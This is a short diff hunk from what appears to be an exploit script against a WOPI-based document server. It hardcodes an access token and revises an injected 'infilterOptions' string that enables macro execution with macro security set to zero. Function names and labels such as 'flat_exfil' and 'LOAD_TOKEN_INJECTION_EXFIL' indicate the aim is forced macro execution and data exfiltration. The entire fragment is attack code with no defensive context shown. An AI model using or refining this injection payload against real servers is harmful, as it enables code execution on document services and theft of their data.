@@ -155,7 +155,7 @@ def main():
     token = "1NUPusl4gZn204nXX72yqWWOqKWSCg_o1ZiGTuGvcTk"
     wopi(token, b"WAITING_FOR_MACRO")
     doc = flat_exfil(token)
-    send(doc, {"infilterOptions": "EnableMacrosExecution=true,MacroSecurityLevel=0"}, "EXFIL_MACRO_CHAIN")
+    send(doc, {"infilterOptions": "x enableMacrosExecution=true macroSecurityLevel=0"}, "LOAD_TOKEN_INJECTION_EXFIL")
     wopi(token)
 
 
